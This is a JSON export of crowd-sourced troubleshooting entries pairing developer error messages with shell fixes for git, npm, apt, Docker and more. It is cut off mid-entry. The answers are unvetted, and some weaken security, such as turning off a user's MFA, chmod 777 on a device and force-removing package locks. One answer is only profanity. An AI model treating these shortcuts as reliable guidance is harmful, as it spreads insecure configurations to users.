[
  {
    "id": 1,
    "keyword": null,
    "link": "                                                ",
    "title": " ! [rejected] master -> master (fetch first)                                                ",
    "description": "git init git add README.md git add . git commit -m \"first commit\" git remote add origin https://github.com/userName/repoName.git git push --force origin master \r\ngit fetch origin master git merge origin master \r\ngit fetch origin master:tmp git rebase tmp git push origin HEAD:master git branch -D tmp \r\ngit fetch //then do  git merge\r\n\r\n                    \r\n                    ",
    "reg_date": "2021-11-01T14:54:39.000Z"
  },
  {
    "id": 2,
    "keyword": null,
    "link": null,
    "title": " \"brute\" task manager mac",
    "description": "dioporco \n",
    "reg_date": "2021-10-11T21:59:38.000Z"
  },
  {
    "id": 3,
    "keyword": null,
    "link": null,
    "title": " \"capacitor\" Permissions Switch must be exhaustive",
    "description": "npm install @capacitor/ios@latest npx cap sync ios\n",
    "reg_date": "2021-10-11T21:59:39.000Z"
  },
  {
    "id": 4,
    "keyword": null,
    "link": null,
    "title": " \"crontab\" change dynamically shell",
    "description": "echo \"$(echo '* * * * * php /srv/path/to/file.php' ; crontab -l)\" | crontab -\n",
    "reg_date": "2021-10-11T21:59:39.000Z"
  },
  {
    "id": 5,
    "keyword": null,
    "link": null,
    "title": " \"gcc\": executable file not found in $PATH",
    "description": "apt-get install build-essential \n",
    "reg_date": "2021-10-11T21:59:39.000Z"
  },
  {
    "id": 6,
    "keyword": null,
    "link": null,
    "title": " \"git reset –- soft head^\"",
    "description": "git reset --soft HEAD^ #The command to undo a commit and reset to the commit before HEAD and keeping the changes is:\n",
    "reg_date": "2021-10-11T21:59:39.000Z"
  },
  {
    "id": 7,
    "keyword": null,
    "link": null,
    "title": " \"python -m venv venv\"",
    "description": "$ python3 -m venv env $ source env/bin/activate\n",
    "reg_date": "2021-10-11T21:59:39.000Z"
  },
  {
    "id": 8,
    "keyword": null,
    "link": null,
    "title": " \"xcode-select: error: tool 'xcodebuild' requires Xcode, but active developer directory",
    "description": "#1. install xcode #2. Ensure Xcode app is in the /Applications directory (NOT /Users/{user}/Applications) #3. run sudo xcode-select -s /Applications/Xcode.app/Contents/Developer\n",
    "reg_date": "2021-10-11T21:59:40.000Z"
  },
  {
    "id": 9,
    "keyword": null,
    "link": null,
    "title": " $$ in shell script",
    "description": "$$ is the process ID (PID) of the script itself.  $BASHPID is the process ID of the current instance of Bash. This is not the same as the $$ variable, but it often gives the same result. \n",
    "reg_date": "2021-10-11T21:59:40.000Z"
  },
  {
    "id": 10,
    "keyword": null,
    "link": null,
    "title": " $'\\r': command not found",
    "description": "sed -i 's/\\r$//' filename\nInside WSL:  sudo apt-get install dos2unix  Then,  dos2unix [file]  Full documentation:  man dos2unix #mdem dos2unix test.sh\nsed -i 's/\\r$//' filename \n",
    "reg_date": "2021-10-11T21:59:40.000Z"
  },
  {
    "id": 11,
    "keyword": null,
    "link": null,
    "title": " 'Cordova/CDVUserAgentUtil.h' file not found",
    "description": "cordova plugin remove cordova-plugin-inappbrowser cordova plugin add cordova-plugin-inappbrowser\n",
    "reg_date": "2021-10-11T21:59:40.000Z"
  },
  {
    "id": 12,
    "keyword": null,
    "link": null,
    "title": " 'gh-pages' is not recognized as an internal or external command",
    "description": "npm install gh-pages  to deploy  add this to package.json  \"predeploy\": \"npm run build\",  \"deploy\": \"gh-pages -d build\"  and then this  npm run deploy\n",
    "reg_date": "2021-10-11T21:59:40.000Z"
  },
  {
    "id": 13,
    "keyword": null,
    "link": null,
    "title": " 'json-server' is not recognized as an internal or external command, operable program or batch file.",
    "description": "npm install -g json-server  npx json-server --watch db.json //if installed locally in your project - use npx to run\n",
    "reg_date": "2021-10-11T21:59:40.000Z"
  },
  {
    "id": 14,
    "keyword": null,
    "link": null,
    "title": " 'node-sass' is not recognized as an internal or external command,",
    "description": "npm install -g node-sass\n",
    "reg_date": "2021-10-11T21:59:40.000Z"
  },
  {
    "id": 15,
    "keyword": null,
    "link": null,
    "title": " 'sanity' is not recognized as an internal or external command",
    "description": "yarn global add @sanity/cli\n",
    "reg_date": "2021-10-11T21:59:40.000Z"
  },
  {
    "id": 16,
    "keyword": null,
    "link": null,
    "title": " 'touch' is not recognized as an internal or external command,",
    "description": " npm install touch-cli -g \nFixed after running this command: npm install touch-cli -g  After that I can run this: >touch index.html   >touch App.js   >touch main.js   >touch webpack.config.js   >touch .babelrc    /* I Hope it will Help you. Namaste Stay Home Stay Safe */\ntouch test.html. \ntype nul > your_file.txt \necho.> your_file.txt \n",
    "reg_date": "2021-10-11T21:59:41.000Z"
  },
  {
    "id": 17,
    "keyword": null,
    "link": null,
    "title": " 'typ \"{}\"not recognised (need to install plug-in?)'.format(self.typ) NotImplementedError: typ \"['safe', 'rt']\"not recognised (need to install plug-in?)",
    "description": "pip3 install ruamel.yaml==0.16.10\n",
    "reg_date": "2021-10-11T21:59:41.000Z"
  },
  {
    "id": 18,
    "keyword": null,
    "link": null,
    "title": " 'vue-cli-service' is not recognized as an internal or external command, operable program or batch file.",
    "description": "npm install -g vue npm install -g @vue/cli npm install @vue/cli-service -g\n",
    "reg_date": "2021-10-11T21:59:41.000Z"
  },
  {
    "id": 19,
    "keyword": null,
    "link": null,
    "title": " 'webpack-dev-server' is not recognized as an internal or external command",
    "description": "npm install -g webpack-dev-server\n",
    "reg_date": "2021-10-11T21:59:41.000Z"
  },
  {
    "id": 20,
    "keyword": null,
    "link": null,
    "title": " (node:14140) UnhandledPromiseRejectionWarning: Error: FFmpeg/avconv not found!",
    "description": "npm i ffmpeg-static --save\n",
    "reg_date": "2021-10-11T21:59:41.000Z"
  },
  {
    "id": 21,
    "keyword": null,
    "link": null,
    "title": " /bin/bash^M: bad interpreter: No such file or directory",
    "description": "if you cannot run a script called yourScript.sh run the following command in terminal  sed -i -e 's/\\r$//' yourScript.sh  Then your script should run\n#The ^M is a carriage return character. Linux uses the line feed character to mark the end of a line, whereas Windows uses the two-character sequence CR LF. Your file has Windows line endings, which is confusing Linux. #remove the cariage character  sed -i -e 's/\\r$//' NAME-OF-FILE.sh \ndos2unix FILENAME\nsed -i -e 's/\\r$//' create_mgw_3shelf_6xIPNI1P.sh \n",
    "reg_date": "2021-10-11T21:59:42.000Z"
  },
  {
    "id": 22,
    "keyword": null,
    "link": null,
    "title": " ? For which GitHub repository would you like to set up a GitHub workflow? (format: user/repository)",
    "description": "USERNAME/REPOSITORYNAME\n",
    "reg_date": "2021-10-11T21:59:42.000Z"
  },
  {
    "id": 23,
    "keyword": null,
    "link": null,
    "title": " @react-navigation/bottom-tabs install",
    "description": "npm i @react-navigation/bottom-tabs\n",
    "reg_date": "2021-10-11T21:59:42.000Z"
  },
  {
    "id": 24,
    "keyword": null,
    "link": null,
    "title": " [!] Android Studio (not installed) flutter",
    "description": "flutter config --android-studio-dir= \"C:\\Program Files\\Android\\Android Studio\"\n$> flutter config --android-studio-dir= \"C:\\Program Files\\Android\\Android Studio\" \nflutter config --android-studio-dir= \" path where android studio is insalled\"\n",
    "reg_date": "2021-10-11T21:59:42.000Z"
  },
  {
    "id": 25,
    "keyword": null,
    "link": null,
    "title": " [ERROR] Error while getting Capacitor CLI version. Is Capacitor installed?",
    "description": "npm install @capacitor/core @capacitor/cli\n",
    "reg_date": "2021-10-11T21:59:42.000Z"
  },
  {
    "id": 26,
    "keyword": null,
    "link": null,
    "title": " [ErrorException] file put contents(./composer.json): failed to open stream: Permission denie     d",
    "description": "sudo chown -R $USER ~/.composer/\n",
    "reg_date": "2021-10-11T21:59:43.000Z"
  },
  {
    "id": 27,
    "keyword": null,
    "link": null,
    "title": " -4048 EPERM npm error",
    "description": "npm cache clean --force\n",
    "reg_date": "2021-10-11T21:59:43.000Z"
  },
  {
    "id": 28,
    "keyword": null,
    "link": null,
    "title": " - laravel/installer is locked to version v3.2.0 and an update of this package was not requested.",
    "description": "#on MAC composer global require laravel/installer --update-with-all-dependencies or composer global remove laravel/installer\n",
    "reg_date": "2021-10-11T21:59:43.000Z"
  },
  {
    "id": 29,
    "keyword": null,
    "link": null,
    "title": " -bash: jupyter: command not found linux",
    "description": "sudo apt install python3-notebook jupyter jupyter-core \n",
    "reg_date": "2021-10-11T21:59:44.000Z"
  },
  {
    "id": 30,
    "keyword": null,
    "link": null,
    "title": " .env in gitignore",
    "description": "git rm .env --cached git commit -m \"Stopped tracking .env File\" \n",
    "reg_date": "2021-10-11T21:59:44.000Z"
  },
  {
    "id": 31,
    "keyword": null,
    "link": null,
    "title": " .gitignore file not ignoring the file",
    "description": "git rm -r --cached . git add . git commit -m &ldquo;.gitignore is now working&rdquo;\n",
    "reg_date": "2021-10-11T21:59:44.000Z"
  },
  {
    "id": 32,
    "keyword": null,
    "link": null,
    "title": " 00h00m00s 0/0: : ERROR: [Errno 2] No such file or directory: 'install'",
    "description": "sudo apt remove cmdtest sudo apt remove yarn curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt-get update sudo apt-get install yarn   yarn install  # Result/output of above command yarn install v1.3.2 warning You are using Node \"6.0.0\" which is not supported and may encounter bugs or unexpected behavior. Yarn supports the following semver range: \"^4.8.0 || ^5.7.0 || ^6.2.2 || >=8.0.0\" info No lockfile found. [1/4] Resolving packages... [2/4] Fetching packages... [3/4] Linking dependencies... [4/4] Building fresh packages...  info Lockfile not saved, no dependencies. Done in 0.20s. \nsudo apt remove cmdtest sudo apt remove yarn curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt-get update sudo apt-get install yarn -y \nsudo apt remove cmdtest sudo apt remove yarn  sudo npm install -g yarn  yarn install \n",
    "reg_date": "2021-10-11T21:59:44.000Z"
  },
  {
    "id": 33,
    "keyword": null,
    "link": null,
    "title": " 0x80370102 The virtual machine could not be started because a required feature is not installed.",
    "description": "Simple solution ,use wsl version 1   Open powershell with admin and run :  wsl --set-default-version 1 \nassuming you installed wsl2 correctly and still getting this error,  possible solution: enable virtualization in BIOS\n",
    "reg_date": "2021-10-11T21:59:44.000Z"
  },
  {
    "id": 34,
    "keyword": null,
    "link": null,
    "title": " 2019 VS MS build broken after install",
    "description": "You have msbuild 16.3 in the GAC, which is why things fail for you.  Please, ungac msbuild by running these commands: (C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\gacutil.exe)  gacutil /u \"MSBuild, Version=15.1.0.0\" gacutil /u \"Microsoft.Build.Conversion.Core, Version=15.1.0.0\" gacutil /u \"Microsoft.Build, Version=15.1.0.0\" gacutil /u \"Microsoft.Build.Engine, Version=15.1.0.0\" gacutil /u \"Microsoft.Build.Tasks.Core, Version=15.1.0.0\" gacutil /u \"Microsoft.Build.Utilities.Core, Version=15.1.0.0\" gacutil /u \"Microsoft.Build.Framework, Version=15.1.0.0\"  \n",
    "reg_date": "2021-10-11T21:59:44.000Z"
  },
  {
    "id": 35,
    "keyword": null,
    "link": null,
    "title": " 2 layer high resolution linux",
    "description": "xrandr\n",
    "reg_date": "2021-10-11T21:59:45.000Z"
  },
  {
    "id": 36,
    "keyword": null,
    "link": null,
    "title": " 7z e into folder linux",
    "description": "7z x file.zip -o./dir1\n",
    "reg_date": "2021-10-11T21:59:45.000Z"
  },
  {
    "id": 37,
    "keyword": null,
    "link": null,
    "title": " AD user turn off MFA",
    "description": "Set-MsolUser -UserPrincipalName user@domain.com -StrongAuthenticationRequirements @() \n",
    "reg_date": "2021-10-11T21:59:45.000Z"
  },
  {
    "id": 38,
    "keyword": null,
    "link": null,
    "title": " Add User to Sudoers in CentOS",
    "description": "#create username and set password useradd username passwd username #Verify the Wheel Group is Enabled sudo visudo %wheel        ALL=(ALL)       ALL #Add User to Group usermod -aG wheel username # Open the Sudoers File in an Editor sudo visudo root ALL=(ALL) ALL username ALL=(ALL) ALL #Now you can switch to new username su &mdash; username\nuseradd username passwd username\n",
    "reg_date": "2021-10-11T21:59:45.000Z"
  },
  {
    "id": 39,
    "keyword": null,
    "link": null,
    "title": " Adding a remote repository",
    "description": "$ git remote add origin https://github.com/user/repo.git # Set a new remote  $ git remote -v # Verify new remote > origin  https://github.com/user/repo.git (fetch) > origin  https://github.com/user/repo.git (push)\ngit init . git remote add origin <http/someURL> git pull origin master\ngit remote add origin <link>\ngit remote add origin git@git.assembla.com:portfolio/space.space_name.git#set a new remotegit remote -v#Verify new remoteorigin  git@git.assembla.com:portfolio/space.space_name.git (fetch)origin  git@git.assembla.com:portfolio/space.space_name.git (push)\n",
    "reg_date": "2021-10-11T21:59:45.000Z"
  },
  {
    "id": 40,
    "keyword": null,
    "link": null,
    "title": " Address already in use - bind(2) for \"127.0.0.1\" port 3000 (Errno::EADDRINUSE)",
    "description": "lsof -wni tcp:3000  kill -9 PID_number\n#get list of process running on tcp:3000 lsof -wni tcp:3000  #you will get something like this COMMAND  PID  USER    FD   TYPE DEVICE SIZE/OFF NODE NAME ruby    2401 ubuntu   10u  IPv4 805038      0t0  TCP 127.0.0.1:3000 (LISTEN) ruby    2401 ubuntu   15u  IPv6 805039      0t0  TCP [::1]:3000 (LISTEN)  #now kill process. #by running this command ->$ kill -9 <PID>  kill -9 2401  #now try to start your server again.\nsudo fuser -k -n tcp port \n",
    "reg_date": "2021-10-11T21:59:45.000Z"
  },
  {
    "id": 41,
    "keyword": null,
    "link": null,
    "title": " Although GNOME Shell integration extension is running, native host connector is not detected.",
    "description": "#  Ubuntu 20.04 sudo apt-get install libproxy1-plugin-networkmanager gnome-shell-extension-system-monitor  # Ubuntu 19.10 sudo apt-get install gir1.2-nm-1.0  \n",
    "reg_date": "2021-10-11T21:59:46.000Z"
  },
  {
    "id": 42,
    "keyword": null,
    "link": null,
    "title": " Amazon Linux 2 AMI install docker",
    "description": "sudo yum update -y sudo amazon-linux-extras install docker # Start Docker service sudo service docker start\n",
    "reg_date": "2021-10-11T21:59:46.000Z"
  },
  {
    "id": 43,
    "keyword": null,
    "link": null,
    "title": " An error occurred while uploading the sketch avrdude: ser open(): can't open device \"/dev/ttyUSB0\": Permission denied",
    "description": "sudo chmod 777 /dev/ttyUSB0 \n",
    "reg_date": "2021-10-11T21:59:46.000Z"
  },
  {
    "id": 44,
    "keyword": null,
    "link": null,
    "title": " Another active Homebrew update process is already in progress",
    "description": "rm -rf /usr/local/var/homebrew/locks \n",
    "reg_date": "2021-10-11T21:59:47.000Z"
  },
  {
    "id": 45,
    "keyword": null,
    "link": null,
    "title": " Another git process seems to be running in this repository, e.g. an editor opened by 'git commit'.",
    "description": "rm -f .git/index.lock\n",
    "reg_date": "2021-10-11T21:59:47.000Z"
  },
  {
    "id": 46,
    "keyword": null,
    "link": null,
    "title": " Another git process seems to be running in this repository",
    "description": "rm -f .git/index.lock\n",
    "reg_date": "2021-10-11T21:59:47.000Z"
  },
  {
    "id": 47,
    "keyword": null,
    "link": null,
    "title": " Ansible ping hosts",
    "description": "$ ansible <hostgroup-name> -m ping\n",
    "reg_date": "2021-10-11T21:59:47.000Z"
  },
  {
    "id": 48,
    "keyword": null,
    "link": null,
    "title": " Apache Maven brew",
    "description": "brew install maven\nbrew install maven@3.2\n",
    "reg_date": "2021-10-11T21:59:48.000Z"
  },
  {
    "id": 49,
    "keyword": null,
    "link": null,
    "title": " ArgumentError: Malformed version number string 0.32+git",
    "description": "curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -  echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list  sudo apt update && sudo apt install yarn  rails webpacker:install\n",
    "reg_date": "2021-10-11T21:59:48.000Z"
  },
  {
    "id": 50,
    "keyword": null,
    "link": null,
    "title": " As there is no 'unzip' command installed zip files",
    "description": "#Error: As there is no 'unzip' command installed zip files // Centos dnf install zip unzip php-zip // Ubuntu apt-get install zip unzip php-zip\n",
    "reg_date": "2021-10-11T21:59:48.000Z"
  },
  {
    "id": 51,
    "keyword": null,
    "link": null,
    "title": " Bash add pause prompt in a shell script with bash pause command",
    "description": "read -p \"Press [Enter] key to start backup...\" read -p \"Press any key to resume ...\" ## Bash add pause prompt for 5 seconds ## read -t 5 -p \"I am going to wait for 5 seconds only ...\"\n",
    "reg_date": "2021-10-11T21:59:49.000Z"
  },
  {
    "id": 52,
    "keyword": null,
    "link": null,
    "title": " Brew was unable to install [php@7.1].",
    "description": "brew remove php@7.1 brew install php@7.1 --build-from-source\n",
    "reg_date": "2021-10-11T21:59:49.000Z"
  },
  {
    "id": 53,
    "keyword": null,
    "link": null,
    "title": " Building wheels for collected packages: opencv-python Building wheel for opencv-python (PEP 517) ...",
    "description": "pip install --upgrade pip setuptools wheel\n",
    "reg_date": "2021-10-11T21:59:50.000Z"
  },
  {
    "id": 54,
    "keyword": null,
    "link": null,
    "title": " CMD check ip addresses on network",
    "description": "arp -a\n",
    "reg_date": "2021-10-11T21:59:50.000Z"
  },
  {
    "id": 55,
    "keyword": null,
    "link": null,
    "title": " Call to undefined function factory() in Psy Shell code on line 1",
    "description": "In Laravel 8, the factory helper is no longer available. Your Thread model  class should use `HasFactory` trait, then you can use your factory like this:  Thread::factory()->count(50)->create();  For more : https://laravel.com/docs/8.x/database-testing#creating-models\n",
    "reg_date": "2021-10-11T21:59:50.000Z"
  },
  {
    "id": 56,
    "keyword": null,
    "link": null,
    "title": " Can't resolve '@capacitor-community/http'",
    "description": "npm i @capacitor-community/http --save-dev\n",
    "reg_date": "2021-10-11T21:59:51.000Z"
  },
  {
    "id": 57,
    "keyword": null,
    "link": null,
    "title": " Can't resolve 'redux-thunk'",
    "description": "npm i redux-thunk\nnpm install --save redux-thunk\n",
    "reg_date": "2021-10-11T21:59:51.000Z"
  },
  {
    "id": 58,
    "keyword": null,
    "link": null,
    "title": " Cannot connect to the Docker daemon at tcp://localhost:2375. Is the docker daemon running?",
    "description": "docker-machine env --shell cmd default \nAdd this to the bitbucket-pipeline.yaml file, on the right step: services:   - docker\necho \"export DOCKER_HOST=tcp://localhost:2375\" >> ~/.bashrc && source ~/.bashrc\nNothing works!!! Just install Linux directly on your system\n",
    "reg_date": "2021-10-11T21:59:51.000Z"
  },
  {
    "id": 59,
    "keyword": null,
    "link": null,
    "title": " Cannot destructure property 'client secret' of 'credentials.installed'",
    "description": "var clientSecret = credentials.installed.client_secret; In this line credentials is pointing to client_secret.json so the first key has to be \"installed\". In my case the key was \"web\" and that was causing the error.  I just renamed the key \"web\" to \"installed\".\n",
    "reg_date": "2021-10-11T21:59:51.000Z"
  },
  {
    "id": 60,
    "keyword": null,
    "link": null,
    "title": " Cannot find module '@angular/compiler-cli'",
    "description": "npm i --save-dev @angular/compiler-cli\nrm -rf node_modules dist npm uninstall -g @angular/cli npm cache clean \n",
    "reg_date": "2021-10-11T21:59:51.000Z"
  },
  {
    "id": 61,
    "keyword": null,
    "link": null,
    "title": " Cannot find module 'node-sass'",
    "description": "sudo npm install --save-dev  --unsafe-perm node-sass\nsudo npm install --save-dev  --unsafe-perm node-sass \n",
    "reg_date": "2021-10-11T21:59:51.000Z"
  },
  {
    "id": 62,
    "keyword": null,
    "link": null,
    "title": " Cannot find module 'typescript'",
    "description": "# NPM Installation Method npm install --global typescript # Global installation npm install --save-dev typescript # Local installation  #Yarn Installation Method yarn global add typescript # Global installation yarn add --dev typescript # Local installation\nnpm install -g typescript\nnpm install -g typescript \n",
    "reg_date": "2021-10-11T21:59:52.000Z"
  },
  {
    "id": 63,
    "keyword": null,
    "link": null,
    "title": " Cannot find module 'xml-js' cordova",
    "description": "npm i xml-js --save\n",
    "reg_date": "2021-10-11T21:59:52.000Z"
  },
  {
    "id": 64,
    "keyword": null,
    "link": null,
    "title": " Cannot find name 'console'. Do you need to change your target library? Try changing the 'lib' compiler option to include 'dom'.",
    "description": "npm install @types/node --save-dev \n",
    "reg_date": "2021-10-11T21:59:52.000Z"
  },
  {
    "id": 65,
    "keyword": null,
    "link": null,
    "title": " Cannot find name 'require'. Do you need to install type definitions for node? Try `npm i @types/node` and then add `node` to the types field in your tsconfig.",
    "description": "npm install @types/node --save-dev \n... \"types\": [ \"node\" ], \"typeRoots\": [ \"../node_modules/@types\" ] ... \n",
    "reg_date": "2021-10-11T21:59:53.000Z"
  },
  {
    "id": 66,
    "keyword": null,
    "link": null,
    "title": " Cannot retrieve metalink for repository: epel/i386. Please verify its path and try again",
    "description": "yum update curl --disablerepo=epel \n",
    "reg_date": "2021-10-11T21:59:53.000Z"
  },
  {
    "id": 67,
    "keyword": null,
    "link": null,
    "title": " Change Git commit user name and author",
    "description": "# For one commit git commit --amend --author=\"Author Name <email@address.com>\"  # for multiple commits git rebase -i B  #if you need to edit A, use  git rebase -i --root #change the lines for both C and D from pick to edit #Once the rebase started, it would first pause at C You would  git commit --amend --author=\"Author Name <email@address.com>\" #Then  git rebase --continue #It would pause again at D #Then you would  git commit --amend --author=\"Author Name <email@address.com>\" #again git rebase --continue #The rebase would complete. #Use  git push -f #to update your origin with the updated commits. \n",
    "reg_date": "2021-10-11T21:59:53.000Z"
  },
  {
    "id": 68,
    "keyword": null,
    "link": null,
    "title": " Check for process and kill if running Linux",
    "description": "if pgrep process_name 2>/dev/null; then   echo \"Terminating process_name\"   pkill process_name fi\nps ux # list the running Process with PID kill xxxx # hear xxxx is the process id\n",
    "reg_date": "2021-10-11T21:59:53.000Z"
  },
  {
    "id": 69,
    "keyword": null,
    "link": null,
    "title": " Check if wayland or x11 is used",
    "description": "$ echo $XDG_SESSION_TYPE x11 \n",
    "reg_date": "2021-10-11T21:59:54.000Z"
  },
  {
    "id": 70,
    "keyword": null,
    "link": null,
    "title": " Cipher algorithm 'AES-256-GCM' not found (OpenSSL)",
    "description": "Your openvpn version is older then 2.4 which do not support AES-256-GCM, hence you should upgrade it via below steps in your 16.04 linux:  curl -s https://swupdate.openvpn.net/repos/repo-public.gpg | apt-key add - echo \"deb http://build.openvpn.net/debian/openvpn/stable xenial main\" > /etc/apt/sources.list.d/openvpn-aptrepo.list apt update apt install -y openvpn  If you found this answer useful, do upvote and donate.\n",
    "reg_date": "2021-10-11T21:59:54.000Z"
  },
  {
    "id": 71,
    "keyword": null,
    "link": null,
    "title": " Clean Up Migrations and Speed up Tests",
    "description": "# Clean up old migrations in the schema folder php artisan schema:dump  # Automatically clean up old files php artisan schema:dump --prune\n",
    "reg_date": "2021-10-11T21:59:54.000Z"
  },
  {
    "id": 72,
    "keyword": null,
    "link": null,
    "title": " Clone a specific repository",
    "description": "git clone --single-branch --branch <branchname> <remote-repo> \n",
    "reg_date": "2021-10-11T21:59:54.000Z"
  },
  {
    "id": 73,
    "keyword": null,
    "link": null,
    "title": " Codineer digital",
    "description": "Codineer Digital is a group of european Software Engineers, creating awesome stuff. Github: https://github.com/CodineerDigital\n",
    "reg_date": "2021-10-11T21:59:55.000Z"
  },
  {
    "id": 74,
    "keyword": null,
    "link": null,
    "title": " Column count of mysql.proc is wrong. Expected 21, found 20. Created with MariaDB 100145, now running 100415. Please use mysql upgrade to fix this error",
    "description": "mysql_upgrade -u root -p service mysqld restart\n",
    "reg_date": "2021-10-11T21:59:55.000Z"
  },
  {
    "id": 75,
    "keyword": null,
    "link": null,
    "title": " Command 'ng' not found, but can be installed with:",
    "description": "The issue is simple, npm doesn't know about ng  Just run npm link @angular/cli and it should work seamlessly.\nnpm i -g @angular/cli\n",
    "reg_date": "2021-10-11T21:59:56.000Z"
  },
  {
    "id": 76,
    "keyword": null,
    "link": null,
    "title": " CondaValueError: The target prefix is the base prefix. Aborting.",
    "description": "conda env create -f environment.yml\n",
    "reg_date": "2021-10-11T21:59:56.000Z"
  },
  {
    "id": 77,
    "keyword": null,
    "link": null,
    "title": " ConfigurationError: The \"dnspython\" module must be installed to use mongodb+srv:// URIs",
    "description": "$ python -m pip install pymongo \n",
    "reg_date": "2021-10-11T21:59:56.000Z"
  },
  {
    "id": 78,
    "keyword": null,
    "link": null,
    "title": " Could not find a part of the path 'E:\\Projects\\Server Migration Projects\\AndrianBus-U8\\Adrian-Bus\\AdrianBus\\bin\\roslyn\\csc.exe'.",
    "description": "Update-Package -reinstall\n",
    "reg_date": "2021-10-11T21:59:56.000Z"
  },
  {
    "id": 79,
    "keyword": null,
    "link": null,
    "title": " Could not find tools.jar debian",
    "description": "sudo apt-get install openjdk-8-jdk\n",
    "reg_date": "2021-10-11T21:59:56.000Z"
  },
  {
    "id": 80,
    "keyword": null,
    "link": null,
    "title": " Could not install from \"Hussain\\AppData\\Roaming\\npm-cache\\ npx\\15208\" as it does not contain a package.json file.",
    "description": "npm config set cache C:\\tmp\\nodejs\\npm-cache --global \n",
    "reg_date": "2021-10-11T21:59:56.000Z"
  },
  {
    "id": 81,
    "keyword": null,
    "link": null,
    "title": " Could not install from \"android\" as it does not contain a package.json file",
    "description": "// Run this command  ionic cordova platform add android\n",
    "reg_date": "2021-10-11T21:59:56.000Z"
  },
  {
    "id": 82,
    "keyword": null,
    "link": null,
    "title": " Could not install packages due to an OSError: [WinError 5] Access is denied:",
    "description": "pip install --upgrade pip --user\npip install <package> --user\n",
    "reg_date": "2021-10-11T21:59:57.000Z"
  },
  {
    "id": 83,
    "keyword": null,
    "link": null,
    "title": " Could not load project management plugin KDevCMakeManager.",
    "description": "-- Ubuntu: > sudo apt-get -y install cmake > which cmake /usr/bin/cmake > cmake --version   > sudo apt-get -y install cmake-qt-gui > which cmake-gui /usr/bin/cmake-gui > cmake-gui --version  \n",
    "reg_date": "2021-10-11T21:59:57.000Z"
  },
  {
    "id": 84,
    "keyword": null,
    "link": null,
    "title": " Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)",
    "description": "Method 1 ps aux | grep -i apt sudo kill -9 <process_id>  Method 2  sudo lsof /var/lib/dpkg/lock sudo lsof /var/lib/apt/lists/lock sudo lsof /var/cache/apt/archives/lock  sudo kill -9 <process_id>  sudo rm /var/lib/apt/lists/lock sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock  sudo dpkg --configure -a  sudo apt update  \nps aux | grep -i apt  sudo kill <process_id> # Check if the process was killed by running the &lsquo;ps aux | grep -i apt&rsquo; command. If it is still running, force kill it with SIGKILL signal:  sudo kill -9 <process_id> # Another, easier way would be to use the killall command. This will kill all the instances of a running program:  sudo killall apt apt-get\nTry 'sudo apt-get update' or 'sudo apt-get upgrade'\nsudo must be used before and after && Example:  sudo apt-get update && sudo apt-get upgrade\nsudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock\nsudo rm /var/lib/apt/lists/lock sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock* \n",
    "reg_date": "2021-10-11T21:59:57.000Z"
  },
  {
    "id": 85,
    "keyword": null,
    "link": null,
    "title": " Could not start Firestore Emulator, port taken mac",
    "description": "# kill process running in port 9000 lsof -ti tcp:9000 | xargs kill -9  # create a bash script - kill-ports.bash # copy and paste the below script #Stop following command execution if command before failed set -e  kill_functions_port() {     # functions emulator port number     lsof -ti tcp:5001 | xargs kill -9 }  kill_firestore_port() {     # firestore emulator port number     lsof -ti tcp:8080 | xargs kill -9 }  kill_database_port() {     # database emulator port number     lsof -ti tcp:9000 | xargs kill -9 }  kill_functions_port && kill_firestore_port && kill_database_port  # add script to package.json  scripts {   ...   \"kill-ports\": \"./kill-ports.bash\", }  # call in bash terminal npm run kill-ports  # grant permission if required to run chmod -R +x ./kill-ports \n",
    "reg_date": "2021-10-11T21:59:57.000Z"
  },
  {
    "id": 86,
    "keyword": null,
    "link": null,
    "title": " Créer un installateur Windows",
    "description": "python setup.py bdist --formats=wininst\npython setup.py build --plat-name=win-amd64 bdist_wininst\n",
    "reg_date": "2021-10-11T21:59:57.000Z"
  },
  {
    "id": 87,
    "keyword": null,
    "link": null,
    "title": " Create A Shared Folder On Linux With Samba",
    "description": "sudo apt install samba #Installing Samba sudo service smbd status #Check Samba Service mkdir /home/<username>/mysambafolder #create your shared folder sudo nano /etc/samba/smb.conf #edit this file with nano  #add this to the end of the smb.conf file [mysambafolder]     comment = My Samba Folder     path = /home/<username>/mysambafolder     readonly = no     writeable = yes     browsable = yes\n",
    "reg_date": "2021-10-11T21:59:57.000Z"
  },
  {
    "id": 88,
    "keyword": null,
    "link": null,
    "title": " Creating an environment from an environment.yml file",
    "description": "conda env create -f environment.yml\n",
    "reg_date": "2021-10-11T21:59:58.000Z"
  },
  {
    "id": 89,
    "keyword": null,
    "link": null,
    "title": " Data path \".builders['app-shell']\" should have required property 'class'.",
    "description": "npm uninstall @angular-devkit/build-angular npm install @angular-devkit/build-angular@0.13.0\n\"@angular-devkit/build-angular\": \"^0.10.0\", \n",
    "reg_date": "2021-10-11T21:59:58.000Z"
  },
  {
    "id": 90,
    "keyword": null,
    "link": null,
    "title": " December global holidays",
    "description": "its almost over...\nMaybe 2020 was kinda weird, but I hope everyone reading this has a wonderful December. Happy Holidays!!! :D\nint dayOfChristmas = 1;          if(dayOfChristmas == 1)         {         Console.WriteLine(\"On the first day of Christmas my true love sent to me: A Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 2)         {         Console.WriteLine(\"On the second day of Christmas my true love sent to me: 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 3)         {         Console.WriteLine(\"On the third day of Christmas my true love sent to me: 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 4)         {         Console.WriteLine(\"On the fourth day of Christmas my true love sent to me:4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 5)         {         